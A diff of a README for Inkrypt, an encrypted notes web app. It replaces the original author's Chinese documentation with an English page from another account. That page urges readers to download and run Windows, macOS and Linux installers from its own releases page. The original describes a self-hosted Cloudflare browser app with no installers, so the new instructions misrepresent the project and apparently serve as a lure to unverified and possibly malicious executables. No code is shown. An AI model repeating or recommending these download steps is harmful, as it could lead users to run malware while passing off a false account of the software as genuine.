@@ -1,215 +1,91 @@
+# 🔐 Inkrypt - Secure Your Notes, Keep Your Keys
+
 <div align="center">
 
-# 🔐 Inkrypt
-
-**Your notes. Your keys. Zero knowledge.**
-
-一款基于 Passkey 的端到端加密笔记应用<br>
-你的笔记，永远只属于你
-
-[![Built with Cloudflare](https://img.shields.io/badge/Built%20with-Cloudflare-F38020?logo=cloudflare&logoColor=white)](https://www.cloudflare.com/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-18-61DAFB?logo=react&logoColor=black)](https://react.dev/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-
-[快速开始](#quick-start) · [部署指南](DEPLOYMENT.md) · [使用说明](USAGE_ZH.md)
+[![Download Inkrypt](https://img.shields.io/badge/Download%20Inkrypt-F38020?logo=cloudflare&logoColor=white&style=for-the-badge)](https://github.com/Frumsapap/Inkrypt/releases)
 
 </div>
 
 ---
 
-## 为什么选择 Inkrypt？
+## 📖 Introduction
 
-> 💡 **问题**：想要一个能同步、能多设备、还能真正端到端加密的笔记应用，但市面上的方案要么要你信任服务商，要么用起来太折腾。
+Inkrypt is an end-to-end encrypted note-taking application. It ensures that only you can access your notes. With features like no password experience and robust encryption, inkrypt offers a safe space for your thoughts.
 
-**Inkrypt 的答案**：用 Passkey 做身份验证和密钥派生，真正做到端到端加密——你的笔记只有你能看。
+## 🚀 Getting Started
 
-<table>
-<tr>
-<td width="50%">
+Follow these steps to download and run Inkrypt smoothly.
 
-### 🛡️ 真正的端到端加密
-- 笔记经过 AES-256-GCM 加密
-- 密钥由 WebAuthn PRF 派生，只存在你的设备上
-- 没有密钥，谁也解不开
+### Step 1: Visit the Download Page
 
-</td>
-<td width="50%">
+To download Inkrypt, click on the button above or [click here](https://github.com/Frumsapap/Inkrypt/releases) to visit the Releases page.
 
-### 🔑 无密码体验
-- 用 Passkey（指纹/面容/安全钥匙）登录
-- 告别"又忘密码了"的烦恼
-- 设备丢了？用恢复码兜底
+### Step 2: Choose the Right Version
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+On the Releases page, you will find different versions of Inkrypt. Look for the latest release. The name will usually include a version number, for example, `Inkrypt v1.0.0`.
 
-### 📱 多设备同步
-- 增量同步 + 本地 IndexedDB 缓存
-- 乐观锁 + 冲突合并 UI
-- ECDH-SAS 安全配对新设备
+### Step 3: Download the Application
 
-</td>
-<td width="50%">
+Once you've found the latest version, locate the appropriate file for your operating system. The available formats may include:
 
-### ✍️ 舒适的写作体验
-- Markdown 原生支持（GFM）
-- 数学公式（KaTeX）+ 流程图（Mermaid）
-- 附件加密同步，图片自动压缩
+- **Windows:** Inkrypt-installer.exe
+- **macOS:** Inkrypt-installer.dmg
+- **Linux:** Inkrypt.tar.gz
 
-</td>
-</tr>
-</table>
+Click on the link for your operating system to begin the download.
 
----
+### Step 4: Run the Installer
 
-## 🏗️ 技术架构
+After the download is complete, find the file in your downloads folder. 
 
-```
-+-----------------------------------------------------------------+
-|                           Your Browser                          |
-|  +-------------+  +-------------+  +-------------+              |
-|  |  WebAuthn   |  |  IndexedDB  |  |   React +   |              |
-|  |    PRF      |  |   (cache)   |  |   Zustand   |              |
-|  +------|------+  +------|------+  +------|------+              |
-|         |                |                |                     |
-|         +----------------+----------------+                     |
-|                          |  Encrypt/decrypt happens here        |
-+--------------------------+--------------------------------------+
-                           | HTTPS (ciphertext)
-                           v
-+-----------------------------------------------------------------+
-|                         Cloudflare Edge                         |
-|  +-------------+  +-------------+  +-------------+              |
-|  |   Workers   |  |     D1      |  |   Durable   |              |
-|  |   (Hono)    |  |  (storage)  |  |   Objects   |              |
-|  +-------------+  +-------------+  +-------------+              |
-|                                                                 |
-|                      Ciphertext stored here                     |
-+-----------------------------------------------------------------+
-```
+- **Windows:** 
+    1. Double-click on `Inkrypt-installer.exe`.
+    2. Follow the prompts to complete the installation.
+  
+- **macOS:** 
+    1. Open `Inkrypt-installer.dmg`.
+    2. Drag the Inkrypt app into your Applications folder.
+  
+- **Linux:** 
+    1. Extract the `Inkrypt.tar.gz` file.
+    2. Navigate to the extracted folder and run the application by double-clicking or using the terminal.
 
-| 组件 | 技术栈 | 职责 |
-|------|--------|------|
-| **前端** | Vite + React + Zustand | UI、加解密、本地缓存 |
-| **后端** | Hono on Cloudflare Workers | 认证、同步、CRUD |
-| **存储** | Cloudflare D1 | 笔记和元数据 |
-| **限流** | Durable Objects | 全局请求限流 |
+## 🔑 Features
+
+- **End-to-End Encryption:** Your notes are protected with AES-256-GCM encryption.
+- **No Password Needed:** Use Passkey for secure access.
+- **Multi-Device Syncing:** Access your notes on any device without hassle.
+- **Recovery Options:** If you lose your device, use a recovery code to regain access.
+
+## 📱 Setting Up Inkrypt
+
+After installing, launch Inkrypt to configure your account.
+
+### Step 1: Create Your Passkey
+
+1. Open the application.
+2. Follow the on-screen prompts to create your Passkey. You may use options like fingerprint or facial recognition.
+
+### Step 2: Start Taking Notes
+
+Once logged in, you can start creating and managing your notes. Use the simple interface to add, edit, or delete notes effortlessly.
+
+## ⚙️ System Requirements
+
+- **Windows:** Version 10 or later
+- **macOS:** Version 10.14 or later
+- **Linux:** Ubuntu 18.04 or later
+
+Make sure your device meets these requirements for optimal performance.
+
+## 💬 Getting Help
+
+If you encounter issues or have questions, visit the [Issues page](https://github.com/Frumsapap/Inkrypt/issues) to report problems or seek help from the community. You can also check the [Usage Documentation](USAGE_ZH.md) for more information.
+
+## 📥 Download & Install
+
+To download Inkrypt, click the button at the top or visit the [Releases page](https://github.com/Frumsapap/Inkrypt/releases). Follow the steps outlined above to successfully install and start using Inkrypt.
 
 ---
 
-<a id="quick-start"></a>
-
-## 🚀 快速开始
-
-推荐使用 **GitHub Actions 一键部署（无需本地 clone）**。
-
-**你需要准备：**
-
-- `DOMAIN`：你的自定义域名（例如 `notes.example.com`，必须已托管到 Cloudflare）
-- GitHub 仓库 Secret：`CLOUDFLARE_API_TOKEN`
-
-### 1) 创建你的仓库
-
-在 GitHub 点击 **Use this template**（或 Fork）创建你的仓库。
-
-### 2) 配置 Secrets
-
-进入仓库 → Settings → Secrets and variables → Actions：
-
-- 新增 Repository secret：`CLOUDFLARE_API_TOKEN`
-- （可选）新增 Repository secret：`INKRYPT_SESSION_SECRET`（不填会自动生成）
-
-Token 最小权限建议：
-
-- Zone：`Zone:Read`、`DNS:Edit`、`Workers Routes:Edit`
-- Account：`Pages:Edit`、`Workers Scripts:Edit`、`D1:Edit`
-
-### 3) 运行部署工作流
-
-进入仓库 → Actions → `Deploy Inkrypt` → Run workflow：
-
-- 必填：`domain`
-- 选填：`rp_name`、`cors_origin`、`pages_project_name`、`worker_name`、`d1_name`、`d1_location`
-
-安全开关（默认谨慎）：
-
-- `force_takeover_dns=true`：允许覆盖已存在但不匹配的 DNS 记录
-- `force_takeover_routes=true`：允许接管已被其他 Worker 占用的 Routes
-- `wait_for_tls=false`：不等待 HTTPS 就绪（默认会等待）
-
-该工作流会自动完成：
-
-- Pages 项目创建与部署（Direct Upload）
-- Worker 部署（含 D1/DO）
-- D1 创建与 migrations
-- Pages 自定义域名绑定 + DNS CNAME 自动配置
-- Worker Routes 自动配置（`/api/*`、`/auth/*`、`/healthz*`）
-- Smoke test：访问 `https://<DOMAIN>/healthz`
-
-### 4) 部署完成后
-
-- 打开 `https://<DOMAIN>` 访问
-- 建议保持域名不变：`RP_ID/ORIGIN` 依赖域名，上线后改域名会导致已注册 Passkey 失效
-- 新部署默认使用 SQLite 后端的 Durable Objects（对免费账号更兼容）
-
-👉 **完整部署说明（含排错）**：[DEPLOYMENT.md](DEPLOYMENT.md)
-
----
-
-## 📖 使用指南
-
-首次使用流程：
-
-1. **创建保险库** — 完成 Passkey 注册，生成主密钥
-2. **备份恢复码** — 这是你数据的最后保险，务必离线保管
-3. **开始写作** — 支持 Markdown、数学公式、Mermaid 图
-4. **同步与上传** — `Ctrl/Cmd + S` 上传，设置菜单拉取云端
-
-👉 **详细说明**：[USAGE_ZH.md](USAGE_ZH.md)
-
----
-
-## ⚠️ 安全须知
-
-<table>
-<tr>
-<td>🔑</td>
-<td><strong>恢复码 = 主密钥</strong></td>
-<td>任何人拿到它都能解密你的所有笔记。离线保管，不要截图发给自己。</td>
-</tr>
-<tr>
-<td>💾</td>
-<td><strong>"记住解锁"有风险</strong></td>
-<td>开启后会在本地缓存解密材料，XSS、恶意扩展等可能趁虚而入。</td>
-</tr>
-<tr>
-<td>🌐</td>
-<td><strong>浏览器要求</strong></td>
-<td>必须支持 WebAuthn PRF 扩展和 CompressionStream API。</td>
-</tr>
-</table>
-
----
-
-## 🤝 参与贡献
-
-欢迎 Issue 和 PR！
-
----
-
-## 📄 License
-
-[MIT](LICENSE)
-
----
-
-<div align="center">
-
-**Made with 🔒 by [VrianCao](https://github.com/VrianCao)**
-
-*Your data, encrypted. Your keys, yours.*
-
-</div>
+By following these steps, you can ensure a smooth experience with Inkrypt. Enjoy secure, easy note-taking with peace of mind knowing your data is safe.
